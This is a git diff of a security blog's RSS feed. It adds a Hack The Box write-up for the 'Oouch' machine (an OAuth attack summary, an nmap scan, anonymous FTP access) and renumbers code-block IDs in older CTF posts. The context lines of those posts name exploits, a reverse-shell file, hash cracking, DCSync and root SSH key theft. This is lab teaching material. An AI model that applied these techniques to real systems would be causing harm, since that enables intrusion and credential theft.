@@ -6,7 +6,73 @@
     <description>Recent content in Posts on squ4r00t</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Wed, 30 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="//localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 07 May 2025 00:00:00 +0000</lastBuildDate><atom:link href="//localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HTB - Oouch</title>
+      <link>//localhost:1313/posts/htb-oouch/</link>
+      <pubDate>Wed, 07 May 2025 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/posts/htb-oouch/</guid>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;Oouch is a hard difficulty Linux machine featuring web applications that use the OAuth authorization framework. Absence of a CSRF Token is leveraged to link an administrative account to our account, providing access to sensitive information. This information is used to register a new client application and steal the authorization code. This code is used to gain an access token, which provides unrestricted access to user resources. A misconfigured DBus server is then exploited through uWSGI in order to execute code in the context of root.&lt;/p&gt;</description>
+      <content>&lt;blockquote&gt;
+&lt;p&gt;Oouch is a hard difficulty Linux machine featuring web applications that use the OAuth authorization framework. Absence of a CSRF Token is leveraged to link an administrative account to our account, providing access to sensitive information. This information is used to register a new client application and steal the authorization code. This code is used to gain an access token, which provides unrestricted access to user resources. A misconfigured DBus server is then exploited through uWSGI in order to execute code in the context of root.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;port-scan-results&#34;&gt;Port Scan Results&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;From the results of the nmap scan, we see that we have 4 ports open: 21, 22, 5000 and 8000&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT     STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;21/tcp   open  ftp     vsftpd 2.0.8 or later
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_-rw-r--r--    1 ftp      ftp            49 Feb 11  2020 project.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5000/tcp open  http    nginx 1.14.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| http-title: Welcome to Oouch
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_Requested resource was http://10.10.10.177:5000/login?next=%2F
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_http-server-header: nginx/1.14.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;8000/tcp open  rtsp
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;From the nmap results, we can see that we have anonymous login allowed and we can access &lt;code&gt;project.txt&lt;/code&gt;:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;698217435&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;698217435&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Retrieving the project.txt file&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+    ~  ftp 10.10.10.177
+
+Connected to 10.10.10.177.
+220 qtc&amp;#39;s development server
+Name (10.10.10.177:squ4r00t): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls
+229 Entering Extended Passive Mode (|||48291|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            49 Feb 11  2020 project.txt
+226 Directory send OK.
+ftp&amp;gt; get project.txt
+local: project.txt remote: project.txt
+229 Entering Extended Passive Mode (|||40240|)
+150 Opening BINARY mode data connection for project.txt (49 bytes).
+100% |***************************************************************************************|    49       65.01 KiB/s    00:00 ETA
+226 Transfer complete.
+49 bytes received in 00:00 (0.94 KiB/s)
+ftp&amp;gt; exit
+221 Goodbye.
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+</content>
+    </item>
+    
     <item>
       <title>HTB - CTF</title>
       <link>//localhost:1313/posts/htb-ctf/</link>
@@ -132,8 +198,8 @@
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;675423819&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;675423819&#34;&gt;
+    &lt;input id=&#34;724368951&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;724368951&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Retrieving the username through LDAP Injection&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -223,8 +289,8 @@ while True:
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;187695324&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;187695324&#34;&gt;
+    &lt;input id=&#34;739864152&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;739864152&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;ldap&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Hypothetical query&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -245,8 +311,8 @@ while True:
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;564183927&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;564183927&#34;&gt;
+    &lt;input id=&#34;591623847&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;591623847&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;ldap&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Resulting query&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -289,8 +355,8 @@ while True:
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;645283719&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;645283719&#34;&gt;
+    &lt;input id=&#34;568129734&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;568129734&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Retrieving the token string through LDAP Injection&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -353,8 +419,8 @@ while True:
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;981567243&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;981567243&#34;&gt;
+    &lt;input id=&#34;853762914&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;853762914&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Generating OTP&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -473,8 +539,8 @@ stoken --token=28544949001137237031740173421571205672037113127257745020417215416
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;173925864&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;173925864&#34;&gt;
+    &lt;input id=&#34;469723518&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;469723518&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;honeypot.sh&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -530,8 +596,8 @@ truncate -s 0 /backup/error.log
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;743215896&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;743215896&#34;&gt;
+    &lt;input id=&#34;172596483&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;172596483&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Monitoring changes on error.log&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -688,8 +754,8 @@ tail -f error.log
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;581246793&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;581246793&#34;&gt;
+    &lt;input id=&#34;796481532&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;796481532&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Decoding users data&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -720,8 +786,8 @@ for line in `cat lines | grep -v &amp;#34;access denied&amp;#34;`; do printf &am
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;536841792&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;536841792&#34;&gt;
+    &lt;input id=&#34;642579183&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;642579183&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Cracking hashes&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -814,8 +880,8 @@ hashcat -m 1400 hashes /usr/share/wordlists/rockyou.txt --username
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;461859237&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;461859237&#34;&gt;
+    &lt;input id=&#34;268439157&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;268439157&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Copying root&amp;rsquo;s private ssh key&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -888,8 +954,8 @@ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCr
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;738692451&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;738692451&#34;&gt;
+    &lt;input id=&#34;817592643&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;817592643&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Dirfuzzing with ffuf&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -971,8 +1037,8 @@ wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration:
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;459132678&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;459132678&#34;&gt;
+    &lt;input id=&#34;324168597&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;324168597&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;php&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;sator.php&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -1034,8 +1100,8 @@ $app -&amp;gt; update_db();
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;164958372&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;164958372&#34;&gt;
+    &lt;input id=&#34;579214368&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;579214368&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;php&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Exploit script&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -1138,8 +1204,8 @@ echo &amp;#34;-&amp;gt; &amp;#34; . serialize($dbe) . &amp;#34;\n&amp;#34;;
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;642598731&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;642598731&#34;&gt;
+    &lt;input id=&#34;527198643&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;527198643&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;php&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;enableSSH.sh&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -1207,8 +1273,8 @@ checkAdded
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;256139784&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;256139784&#34;&gt;
+    &lt;input id=&#34;432895167&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;432895167&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Updating script&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -1330,8 +1396,8 @@ done
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;428396517&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;428396517&#34;&gt;
+    &lt;input id=&#34;615934728&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;615934728&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Accessing API without the token&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -1349,8 +1415,8 @@ curl http://mywalletv1.instant.htb/api/v1/view/profile
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;639145728&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;639145728&#34;&gt;
+    &lt;input id=&#34;516792834&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;516792834&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Accessing API with the token&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -1450,8 +1516,8 @@ curl http://mywalletv1.instant.htb/api/v1/view/profile -H &amp;#34;Authorization
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;267543819&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;267543819&#34;&gt;
+    &lt;input id=&#34;917452836&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;917452836&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Cleaning up key file&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -1650,8 +1716,8 @@ cat key | sed &amp;#39;s/^    &amp;#34;//&amp;#39; | sed &amp;#39;s/\\n&amp;#34;
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;614752893&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;614752893&#34;&gt;
+    &lt;input id=&#34;416592783&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;416592783&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;cif&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;/static/example.cif&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -1684,8 +1750,8 @@ loop_
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;548329716&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;548329716&#34;&gt;
+    &lt;input id=&#34;942685731&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;942685731&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;POC cif file&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -1714,8 +1780,8 @@ _space_group_magn.name_BNS  &amp;#34;P  n&amp;#39;  m  a&amp;#39;  &amp;#34;
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;539782164&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;539782164&#34;&gt;
+    &lt;input id=&#34;689357214&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;689357214&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;cif&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Reverse shell cif file&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -1829,8 +1895,8 @@ _space_group_magn.name_BNS  &amp;#34;P  n&amp;#39;  m  a&amp;#39;  &amp;#34;
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;715628439&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;715628439&#34;&gt;
+    &lt;input id=&#34;568374921&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;568374921&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;SQLite database found&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -1857,8 +1923,8 @@ database.db: SQLite 3.x database, last written using SQLite version 3031001
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;142976583&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;142976583&#34;&gt;
+    &lt;input id=&#34;684751392&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;684751392&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Cracking rosa&amp;rsquo;s hash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -1903,8 +1969,8 @@ hashcat -m 0 &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; /usr/share/wordlists/rockyou
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;341927568&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;341927568&#34;&gt;
+    &lt;input id=&#34;238679541&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;238679541&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Port forwarding :8080&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -1941,8 +2007,8 @@ ssh -L 8080:127.0.0.1:8080 rosa@10.10.11.38
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;893625174&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;893625174&#34;&gt;
+    &lt;input id=&#34;713945862&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;713945862&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;CVE-2024-23334 Exploit POC (modified)&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -2053,8 +2119,8 @@ done
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;476381259&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;476381259&#34;&gt;
+    &lt;input id=&#34;652134897&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;652134897&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;User Enumeration with rpcclient through a NUL session&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -2117,8 +2183,8 @@ user:[santi] rid:[0x480]
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;268497531&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;268497531&#34;&gt;
+    &lt;input id=&#34;168972543&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;168972543&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;ASREPRoasting using impacket-GetNPUsers&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -2147,8 +2213,8 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:5f9...&amp;lt;SNIP&amp;gt;...63836d7
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;836745129&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;836745129&#34;&gt;
+    &lt;input id=&#34;283694157&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;283694157&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Cracking service ticket&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -2173,8 +2239,8 @@ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;863419527&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;863419527&#34;&gt;
+    &lt;input id=&#34;786439512&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;786439512&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Login via winrm as svc-alfresco&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -2202,8 +2268,8 @@ evil-winrm -i 10.129.30.97 -u svc-alfresco -p &amp;lt;PASSWORD&amp;gt;
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;835721469&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;835721469&#34;&gt;
+    &lt;input id=&#34;927845631&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;927845631&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Collecting data for bloodhound&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -2238,8 +2304,8 @@ zip -r data.zip *.json
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;496831257&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;496831257&#34;&gt;
+    &lt;input id=&#34;453729618&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;453729618&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;powershell&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Getting DCSync privilege&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -2264,8 +2330,8 @@ Add-ObjectACL -PrincipalIdentity hackerr -Credential $cred -Rights DCSync
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;651839247&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;651839247&#34;&gt;
+    &lt;input id=&#34;418675392&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;418675392&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;DCSync using impacket-secretsdump&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -2290,8 +2356,8 @@ impacket-secretsdump htb.local/hackerr:&amp;#39;password123!&amp;#39;@10.129.30.
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;217498356&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;217498356&#34;&gt;
+    &lt;input id=&#34;781423956&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;781423956&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Login via winrm as Administrator&lt;/span&gt;
